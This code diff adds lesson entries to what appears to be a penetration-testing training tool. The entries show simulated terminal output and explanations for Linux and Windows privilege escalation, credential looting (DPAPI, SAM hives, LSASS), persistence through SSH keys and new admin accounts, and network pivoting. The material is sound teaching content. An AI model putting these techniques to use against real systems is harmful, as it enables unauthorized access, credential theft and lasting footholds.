@@ -1307,5 +1307,203 @@
       teach: 'A PowerShell reverse shell calls back to your listener the same way a Linux one does — the "connect to … from" line is the target reaching you. You land as the service account the web app runs under; the next step is Windows enumeration.',
     },
 
+    // ==================== LINUX PRIVESC (depth) ====================
+    'nfs-squash': {
+      output: [
+        '$ showmount -e 10.10.10.10',
+        '/srv/share  10.10.10.0/24   (no_root_squash)',
+        '$ # mount it, drop a root-owned SUID binary from your box',
+        '# mounted; owner uid 0 preserved',
+      ].join('\n'),
+      signal: '/srv/share  10.10.10.0/24   (no_root_squash)',
+      teach: '`no_root_squash` on an NFS export means files you create as root on your own machine stay root-owned on the target. Drop a root-owned SUID shell into the share and run it on the box — a classic NFS privesc. Check the export options first.',
+    },
+    'lxc-lxd-escape': {
+      output: [
+        '$ id',
+        'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
+        '$ # import a tiny image, launch it privileged, mount host /',
+        'root@container:/mnt/root# cat /mnt/root/root/root.txt',
+      ].join('\n'),
+      signal: 'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
+      teach: 'Membership in the `lxd` group is root-equivalent: you launch a privileged container that mounts the host\'s filesystem at /mnt/root and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one.',
+    },
+    'linux-loot-hunt': {
+      output: [
+        '$ cat ~/.bash_history',
+        'mysql -u root -pSuperSecret123',
+        '$ grep -rils "password" /var/www 2>/dev/null',
+        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
+      ].join('\n'),
+      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
+      teach: 'Once you have a shell, loot before you escalate. Shell history, config files, and web roots leak passwords constantly — and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for "password", "secret", and "key".',
+    },
+    'linux-persistence': {
+      output: [
+        '$ mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA...you" >> ~/.ssh/authorized_keys',
+        '$ ssh -i you user@10.10.10.10',
+        'user@target:~$  # back in, no password',
+      ].join('\n'),
+      signal: 'user@target:~$  # back in, no password',
+      teach: 'Labs revert and shells die. Adding your public key to `authorized_keys` gives you a stable, password-free way back in — far better than re-exploiting each time. On a real engagement, persistence is scoped and documented; on the exam it just saves you grief.',
+    },
+
+    // ==================== WINDOWS PRIVESC (depth) ====================
+    'dpapi-secrets': {
+      output: [
+        '$ # Credentials + masterkey blobs found under %APPDATA%',
+        '[*] Decrypting with user masterkey',
+        '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
+      ].join('\n'),
+      signal: '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
+      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials — often for other systems the user accessed.',
+    },
+    'windows-old-hives': {
+      output: [
+        '$ dir C:\\Windows.old\\Windows\\System32\\config',
+        'SAM   SYSTEM   SECURITY',
+        '$ # pull them, then dump offline',
+        'Administrator:500:aad3b...:2b576acbe6b...:::',
+      ].join('\n'),
+      signal: 'Administrator:500:aad3b...:2b576acbe6b...:::',
+      teach: 'A `Windows.old` folder from an in-place upgrade keeps old registry hives — SAM and SYSTEM — that a low-priv user can often read. Dump them offline for the local Administrator hash, then pass it. Leftover backups are a quiet privesc.',
+    },
+    'lsass-dump-onbox': {
+      output: [
+        '$ # with local admin, LSASS memory holds live secrets',
+        '[*] Parsing credentials from the dump',
+        'Username: administrator   NTLM: 2b576acbe6b...',
+      ].join('\n'),
+      signal: 'Username: administrator   NTLM: 2b576acbe6b...',
+      teach: 'LSASS holds the credentials of everyone logged in. With local admin you can read its memory and recover NTLM hashes (and sometimes cleartext) for those sessions — including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
+    },
+    'windows-persistence': {
+      output: [
+        'C:\\> net user obol_svc Str0ng!Pass /add',
+        'The command completed successfully.',
+        'C:\\> net localgroup Administrators obol_svc /add',
+        'The command completed successfully.',
+      ].join('\n'),
+      signal: 'C:\\> net localgroup Administrators obol_svc /add',
+      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; on the exam it saves you re-escalating. Note what you create so you can remove it.',
+    },
+    'defense-enum': {
+      output: [
+        'PS> $ExecutionContext.SessionState.LanguageMode',
+        'ConstrainedLanguage',
+        'PS> Get-AppLockerPolicy -Effective -Xml  # rules present',
+        'PS> Get-MpComputerStatus | select RealTimeProtectionEnabled',
+        'True',
+      ].join('\n'),
+      signal: 'ConstrainedLanguage',
+      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
+    },
+
+    // ==================== PIVOTING & TUNNELING (depth) ====================
+    'local-linux-routes': {
+      output: [
+        '$ ip route',
+        'default via 10.10.10.1 dev eth0',
+        '172.16.5.0/24 dev eth1  proto kernel  scope link',
+      ].join('\n'),
+      signal: '172.16.5.0/24 dev eth1  proto kernel  scope link',
+      teach: 'The routing table on a compromised host shows which networks it can reach directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
+    },
+    'local-linux-neighbors': {
+      output: [
+        '$ ip neigh',
+        '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
+        '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
+      ].join('\n'),
+      signal: '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
+      teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment — live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
+    },
+    'local-linux-dns': {
+      output: [
+        '$ cat /etc/resolv.conf',
+        'search corp.local',
+        'nameserver 172.16.5.10',
+      ].join('\n'),
+      signal: 'nameserver 172.16.5.10',
+      teach: 'The internal DNS server and search domain tell you this host lives in `corp.local` and resolves names via 172.16.5.10 — likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the internal network by name.',
+    },
+    'local-windows-interfaces': {
+      output: [
+        'C:\\> ipconfig',
+        'Ethernet adapter Ethernet0:',
+        '   IPv4 Address. . . : 10.10.10.20',
+        'Ethernet adapter Ethernet1:',
+        '   IPv4 Address. . . : 172.16.5.20',
+      ].join('\n'),
+      signal: '   IPv4 Address. . . : 172.16.5.20',
+      teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box — the reason to pivot. Map the interfaces first; they define what is now in range.',
+    },
+    'local-windows-routes': {
+      output: [
+        'C:\\> route print',
+        'Network Destination  Netmask        Gateway    Interface',
+        '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
+      ].join('\n'),
+      signal: '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
+      teach: 'Windows `route print` shows the networks this host routes to directly. An "On-link" entry for 172.16.5.0/24 is a subnet reachable from here but not from your box — your pivot target.',
+    },
+    'local-windows-neighbors': {
+      output: [
+        'C:\\> arp -a',
+        'Interface: 172.16.5.20',
+        '  172.16.5.10     00-0c-29-11-22-33   dynamic',
+        '  172.16.5.30     00-0c-29-44-55-66   dynamic',
+      ].join('\n'),
+      signal: '  172.16.5.10     00-0c-29-11-22-33   dynamic',
+      teach: 'The Windows ARP cache lists internal hosts this box has communicated with — confirmed-alive targets on the far side, discovered without sending a single scan packet. Start your internal enumeration from these.',
+    },
+    'local-windows-listeners': {
+      output: [
+        'C:\\> netstat -ano | findstr LISTENING',
+        '  TCP    0.0.0.0:445      LISTENING   4',
+        '  TCP    127.0.0.1:1433   LISTENING   3120',
+      ].join('\n'),
+      signal: '  TCP    127.0.0.1:1433   LISTENING   3120',
+      teach: 'A service bound to 127.0.0.1 is reachable only from the box itself — like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
+    },
+    'pivot-ssh-dynamic': {
+      output: [
+        '$ ssh -D 1080 -N bob@10.10.10.10',
+        '$ tail /etc/proxychains4.conf',
+        'socks5 127.0.0.1 1080',
+        '$ proxychains -q nmap -sT -Pn 172.16.5.20',
+      ].join('\n'),
+      signal: 'socks5 127.0.0.1 1080',
+      teach: 'An SSH dynamic port-forward (`-D`) turns an SSH session into a SOCKS proxy — the simplest pivot when you have SSH creds, no extra tools needed. Point proxychains at 127.0.0.1:1080 and your tools reach the internal network through the box.',
+    },
+    'pivot-sshuttle': {
+      output: [
+        '$ sshuttle -r bob@10.10.10.10 172.16.5.0/24',
+        'c : Connected to server.',
+        '$ nmap -sT -Pn 172.16.5.20   # no proxychains needed',
+      ].join('\n'),
+      signal: 'c : Connected to server.',
+      teach: 'sshuttle builds a transparent VPN-like route over SSH: once "Connected", traffic to 172.16.5.0/24 just works, with no proxychains wrapper. It is the most convenient pivot when you have SSH access and want your tools to behave normally.',
+    },
+    'pivot-ligolo': {
+      output: [
+        'ligolo-proxy » session',
+        '[Agent] joined from 10.10.10.20',
+        'ligolo-proxy » # add route to 172.16.5.0/24 via the tun iface',
+        '[+] Route added, internal subnet reachable',
+      ].join('\n'),
+      signal: '[+] Route added, internal subnet reachable',
+      teach: 'Ligolo-ng gives you a real network interface to the internal subnet — fast, and no proxychains. Run the agent on the compromised host, add a route to 172.16.5.0/24, and your box reaches it natively. The modern choice for a clean pivot.',
+    },
+    'pivot-scan-through': {
+      output: [
+        '$ proxychains -q nmap -sT -Pn -n 172.16.5.20',
+        '172.16.5.20   PORT   STATE SERVICE',
+        '172.16.5.20   445/tcp open  microsoft-ds',
+      ].join('\n'),
+      signal: '172.16.5.20   445/tcp open  microsoft-ds',
+      teach: 'Through a SOCKS proxy you must use TCP connect scans (`-sT`) and skip host discovery (`-Pn`) — SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts all over again, one network deeper.',
+    },
+
   };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
